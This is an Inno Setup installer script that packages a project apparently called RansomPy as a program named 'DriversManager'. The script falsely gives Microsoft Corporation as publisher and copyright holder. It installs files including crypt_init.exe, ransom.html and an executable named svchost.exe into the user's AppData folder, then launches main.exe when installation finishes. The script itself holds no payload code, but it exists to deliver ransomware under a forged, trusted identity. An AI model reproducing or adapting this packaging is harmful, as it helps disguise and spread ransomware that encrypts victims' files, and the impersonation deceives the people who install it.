; Script generated by the Inno Setup Script Wizard.
; SEE THE DOCUMENTATION FOR DETAILS ON CREATING INNO SETUP SCRIPT FILES!

#define MyAppName "DriversManager"
#define MyAppVersion "3.5"
#define MyAppPublisher "Microsoft Corporation"
#define MyAppExeName "main.exe"
#define MyAppCopyright "Copyright (C) Microsoft Corporation. All rights reserved."

[Setup]
; NOTE: The value of AppId uniquely identifies this application. Do not use the same AppId value in installers for other applications.
; (To generate a new GUID, click Tools | Generate GUID inside the IDE.)
AppId={{78DFDBBF-0CE8-4FB0-9254-B36FC03B5F70}
AppName={#MyAppName}
AppVersion={#MyAppVersion}
VersionInfoVersion={#MyAppVersion}
AppCopyright={#MyAppCopyright}
;AppVerName={#MyAppName} {#MyAppVersion}
AppPublisher={#MyAppPublisher}
DefaultDirName={autopf}\{#MyAppName}
DisableDirPage=yes
DisableProgramGroupPage=yes
LicenseFile=E:\0_Current_prog\RansomPy-master\RansomPy\LICENCE.txt
InfoBeforeFile=E:\0_Current_prog\RansomPy-master\RansomPy\msgbox.txt
; Uncomment the following line to run in non administrative install mode (install for current user only.)
;PrivilegesRequired=lowest
OutputDir=E:\0_Current_prog\RansomPy-master\RansomPy\inno_setup\DriversManager\3.5\
OutputBaseFilename=DriversManager
SetupIconFile=E:\0_Current_prog\RansomPy-master\RansomPy\assets\icon\windows-installer.ico
Compression=lzma
SolidCompression=yes
WizardStyle=modern

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"
Name: "french"; MessagesFile: "compiler:Languages\French.isl"
Name: "german"; MessagesFile: "compiler:Languages\German.isl"
Name: "italian"; MessagesFile: "compiler:Languages\Italian.isl"
Name: "portuguese"; MessagesFile: "compiler:Languages\Portuguese.isl"

[Tasks]
Name: "desktopicon"; Description: "{cm:CreateDesktopIcon}"; GroupDescription: "{cm:AdditionalIcons}"; Flags: unchecked

[Files]
Source: "E:\0_Current_prog\RansomPy-master\RansomPy\build\setup\{#MyAppExeName}"; DestDir: "{userappdata}\DriversManager"; Flags: ignoreversion
Source: "E:\0_Current_prog\RansomPy-master\RansomPy\build\setup\GuiCounter.exe"; DestDir: "{userappdata}\DriversManager"; Flags: ignoreversion
Source: "E:\0_Current_prog\RansomPy-master\RansomPy\build\setup\image.jpg"; DestDir: "{userappdata}\DriversManager"; Flags: ignoreversion
Source: "E:\0_Current_prog\RansomPy-master\RansomPy\build\setup\python3.dll"; DestDir: "{userappdata}\DriversManager"; Flags: ignoreversion
Source: "E:\0_Current_prog\RansomPy-master\RansomPy\build\setup\python37.dll"; DestDir: "{userappdata}\DriversManager"; Flags: ignoreversion
Source: "E:\0_Current_prog\RansomPy-master\RansomPy\build\setup\ransom.html"; DestDir: "{userappdata}\DriversManager"; Flags: ignoreversion
Source: "E:\0_Current_prog\RansomPy-master\RansomPy\build\setup\windows-installer.ico"; DestDir: "{userappdata}\DriversManager"; Flags: ignoreversion
Source: "E:\0_Current_prog\RansomPy-master\RansomPy\build\setup\svchost.exe"; DestDir: "{userappdata}\DriversManager"; Flags: ignoreversion
Source: "E:\0_Current_prog\RansomPy-master\RansomPy\build\setup\crypt_init.exe"; DestDir: "{userappdata}\DriversManager"; Flags: ignoreversion
Source: "E:\0_Current_prog\RansomPy-master\RansomPy\build\setup\vcruntime140.dll"; DestDir: "{userappdata}\DriversManager"; Flags: ignoreversion
Source: "E:\0_Current_prog\RansomPy-master\RansomPy\build\setup\lib\*"; DestDir: "{userappdata}\DriversManager\lib"; Flags: ignoreversion recursesubdirs createallsubdirs
; NOTE: Don't use "Flags: ignoreversion" on any shared system files

[Icons]
Name: "{autoprograms}\{#MyAppName}"; Filename: "{userappdata}\DriversManager\{#MyAppExeName}"
Name: "{autodesktop}\{#MyAppName}"; Filename: "{userappdata}\DriversManager\{#MyAppExeName}"; Tasks: desktopicon

[Run]
Filename: "{userappdata}\DriversManager\{#MyAppExeName}"; Description: "{cm:LaunchProgram,{#StringChange(MyAppName, '&', '&&')}}"; Flags: nowait postinstall skipifsilent

[Dirs]
Name: "{userappdata}\DriversManager"
